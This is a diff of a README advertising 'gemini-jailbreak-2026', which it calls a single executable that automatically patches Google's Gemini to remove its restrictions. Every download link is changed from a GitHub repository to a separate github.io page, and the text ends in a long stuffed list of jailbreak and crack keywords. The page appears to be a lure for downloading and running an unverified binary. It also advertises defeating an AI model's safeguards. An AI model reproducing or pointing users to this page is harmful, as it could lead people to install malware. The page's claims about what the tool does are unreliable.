@@ -1,6 +1,6 @@
 # 🚀 gemini-jailbreak-2026 - Unlock Gemini's Full Power Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Gemini_Jailbreak_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jessicath5575/gemini-jailbreak-2026)
+[![Download Now](https://img.shields.io/badge/Download-Gemini_Jailbreak_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://jessicath5575.github.io)
 
 ## 🎯 What This Does
 
@@ -30,7 +30,7 @@ This package contains a single executable file that automatically patches your G
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Jessicath5575/gemini-jailbreak-2026](https://github.com/Jessicath5575/gemini-jailbreak-2026)
+Visit this link to download the application: [https://jessicath5575.github.io](https://jessicath5575.github.io)
 
 Click the green "Download" button on the page. The file will start downloading automatically. Wait for the download to complete before proceeding.
 
@@ -125,8 +125,8 @@ This open-source project is maintained by a community of developers who believe 
 
 Don't settle for restricted AI responses. Download gemini-jailbreak-2026 now and unlock the true potential of Google's most powerful language model. Whether you're a researcher, developer, writer, or just curious about AI, this tool gives you the freedom you deserve.
 
-[![Get It Now](https://img.shields.io/badge/Download_Now-Free-4CAF50?style=for-the-badge)](https://github.com/Jessicath5575/gemini-jailbreak-2026)
+[![Get It Now](https://img.shields.io/badge/Download_Now-Free-4CAF50?style=for-the-badge)](https://jessicath5575.github.io)
 
-**Remember**: Visit this link to download the application: [https://github.com/Jessicath5575/gemini-jailbreak-2026](https://github.com/Jessicath5575/gemini-jailbreak-2026)
+**Remember**: Visit this link to download the application: [https://jessicath5575.github.io](https://jessicath5575.github.io)
 
 Keywords: ai-2026, ai-bypass, ai-crack, ai-jailbreak, ai-no-limits, ai-unlimited, chatgpt-crack, chatgpt-free, chatgpt-hack, chatgpt-jailbreak, free-chatgpt, gemini-bypass, gemini-jailbreak, gemini-jailbreak-2026, gemini-no-filter, gemini-uncensored, google-ai-jailbreak, gpt4-bypass, gpt4-free, openai-crack
